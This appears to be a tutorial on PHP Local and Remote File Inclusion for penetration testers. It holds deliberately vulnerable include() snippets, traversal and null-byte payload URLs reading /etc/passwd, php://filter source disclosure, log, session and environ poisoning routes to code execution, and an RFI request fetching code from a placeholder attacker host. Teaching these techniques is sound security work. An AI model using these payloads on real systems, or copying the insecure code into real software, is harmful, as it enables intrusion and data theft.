# Local File Inclusion

Local File Inclusion is a common vulnerability in PHP, where the attacker leverages functions such as:
- require
- include
- require_once
- include_once

To **extract sensitive information** or gain **Remote Code Execution** on the web server.

There are many techniques that can help us, ethical hackers, to actually gain the sensitive information or gain access to the web server.

But first, we need to know, how LFI works.

## How does Local File Inclusion work?

Here is a basic example of how this attack works, let's say we have the following snippet of PHP code in our project:
```php
<?php
    $file = $_GET['file'];

    if(isset($file)) {
        include("a/b/c/$file");
    } else {
        include("a/b/c/index.php");
    }
?>
```

This code first assigns the `?file=` query parameter value to the `$file` variable. Next, it check if `$file` is initialized with a value, if it is, it will "copy" content from a file in the `a/b/c` directory and run PHP code, if there is any in that file. That is how the `include` function works.

We notice that we have control over the `$file` variable, since the `$_GET` object just returns all the available URL [query parameters](https://en.wikipedia.org/wiki/Query_string).

A normal request for an example homepage would look like this:

```
https://example.com/?file=home.php
```

This will add the value `home.php` to the property `$_GET['file']`.

To check if the code is sanitized in some way (conducting a black box penetration test), we can try to request for `/etc/passwd`:

```
https://example.com/?file=../../../../../../../../etc/passwd

OR

https://example.com/?file=/etc/passwd
```

If the webpage gives us the content of `/etc/passwd`, we can try a couple more tests to safely say that we found a LFI vulnerability (it would be a critical severity vulnerability if we would be able to get RCE working as well) and report it to the company through a bug bounty program, or write it in the report if we are conducting a pentest.

The application also can have a suffix that can prevent us from accessing files other than `.php` or one defined in the source code, for example:

```php
<?php 
    $file = $_GET['file'];

    if(isset($file)) {
        include("a/b/c/$file".".php");
    } else {
        include("a/b/c/index.php");
    }
?>
```

The only difference between the previous snippet of code is that we now append the `.php` string to the end of the `include` function parameter.

An example request would be:

```
https://example.com/?file=home
```

How can we evade the `.php` extension? 

## Extension evasion techniques

### Path Truncation ( Available in versions older than PHP 5.3.0 )
This technique takes advantage of the file size limit of PHP. Any file that exceeds 4096 bytes will have everything after that size discarded, including the ".php" suffix. An example of this kind of attack would be:

```
https://example.com/?file=invalidFile../../../../../../../../etc/passwd/././././<repeat "./" until 4096 Bytes or more>
```

There are a couple of attack payloads described [here](https://book.hacktricks.xyz/pentesting-web/file-inclusion#path-truncation).

### Null Byte Injection ( Available in versions older than PHP 5.4.0 )
Null Byte Injection is a way to evade suffixes with one NULL character. The way it works is that you append the [%00](https://en.wikipedia.org/wiki/Null_character) character to the end of a request that can indicate to the PHP interpreter that "Hey, this is the end of the string so everything after that should be discarded". This means that the request:

```
https://example.com/?file=/etc/passwd%00
```

Would resolve in the source code like this:

```php
<?php
    $file = "/etc/passwd%00"; // $_GET['file']

    if(isset($file)) {
        include("/etc/passwd"); // The .php extension is discarded because of the NULL char.
    } else {
        include("a/b/c/index.php");
    }
?>
```

## Information Extraction Techniques

### PHP Filter Technique
PHP wrappers are used to interact with streams of data such as stdin and stdout. We will actually only leverage the `php://filter` wrapper to read files without running PHP code if there is any. To start, we first check for LFI (first chapter). Then, to read for example, `home.php`, without running the PHP code inside, we just send the following request:

```
https://example.com/?file=php://filter/convert.base64-encode/resource=home.php
```

This will convert the `home.php` file, and encode it in **base64**, giving us the **full encoded source code**. We can then decode it in a program of our liking, **CyberChef**, **dcode.fr** are one of many websites we can use. 

We can also use `php://filter/string.rot13/resource=<x>`, but bear in mind that if you use it, the browser WILL attempt to parse the whole source code since special characters like `<` and `>` are not encoded, so it will be a bit more difficult to extract information from the website with this technique, but if `convert.base64-encode` doesn't work for some weird reason, why not try the other?

## Remote Code Execution Techniques

### Environ Technique
In the `/proc/self/envrion` file, we have environment variables that are loaded for the current process. If it allows us to, we can gain information about a couple of header values, such as the `HTTP_USER_AGENT` environment variable. We simply modify our `User-Agent` header to php source code and include `/proc/self/environ` to execute it and potentially gain Remote Code Execution. Bear in mind that `self` here will be automatically converted to the according process directory when accessing it within the application.

### Data URI Scheme Technique
Using the `data:` URI scheme, we are able to send PHP code to the webserver, include it and execute the code. An example would be:

```php
<?php 
    $file = $_GET['file'];

    if(isset($file)) {
        include($file);
    } else {
        include("a/b/c/index.php");
    }
?>
```

**NOTE** that this technique is only available if the `allow_url_include` option is set to true.

### PHP Session Cookie Technique
This technique leverages session cookie operations by modifying values that are saves inside session files. The files are by default located in `/tmp/sess_<sess_id>`, where `sess_id` is the value of the `PHPSESSID` cookie that you get by logging into a site, or even viewing it (depends where the `session_start` function exists in the code). 

To test it, consider a page where you have a login system. When logging in, you always get a `PHPSESSID` cookie, so that the web server remembers who you are when navigating from page to page. It usually saves user input that you control, so by including the session file and inspecting it, you can know the attack vectors available for you.

After knowing what inputs you control, you simply delete that session cookie and make another one with **PHP source code** as the username and try to login.

## Remote File Inclusion

Remote File Inclusion is the same as Local File Inclusion, except that we can download data from another domain using the `http://` URI scheme that the vulnerable functions support.

One thing to note is that Remote File Inclusions only work if `allow_url_include` is enabled, which isn't enabled by default.

This is an example request for a remote file:
```
https://example.com/?file=https://<attacker-ip>/<attacker-file>.php
```

## Useful resources:
- [Null Byte Injection - PHP](https://resources.infosecinstitute.com/null-byte-injection-php/)
- [File Inclusion - HackTricks.xyz](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [Remote File Inclusion - Acunetix](https://www.acunetix.com/blog/articles/remote-file-inclusion-rfi/)
- [OWASP - Testing for Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
